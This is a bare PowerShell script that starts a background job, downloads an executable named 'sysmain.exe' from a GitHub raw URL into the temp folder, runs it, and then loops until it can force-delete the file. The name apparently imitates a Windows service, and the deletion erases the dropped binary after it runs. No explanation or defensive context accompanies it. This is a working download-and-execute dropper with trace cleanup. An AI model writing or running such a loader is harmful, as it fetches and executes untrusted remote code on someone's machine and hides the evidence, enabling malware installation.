Start-Job {
    try {
        $exe = "$env:TEMP\sysmain.exe"
        Invoke-WebRequest "https://github.com/paneluserop/stm/raw/refs/heads/main/sysmain.exe" -OutFile $exe
        $proc = Start-Process -FilePath $exe -PassThru
        $proc.WaitForExit()

        while (Test-Path $exe) {
            try {
                $s = [System.IO.File]::Open($exe, 'Open', 'ReadWrite', 'None')
                $s.Close()
                Remove-Item $exe -Force
                break
            } catch {
                Start-Sleep -Milliseconds 500
            }
        }
    } catch {
        Write-Host "❌ Error: $_"
    }
}
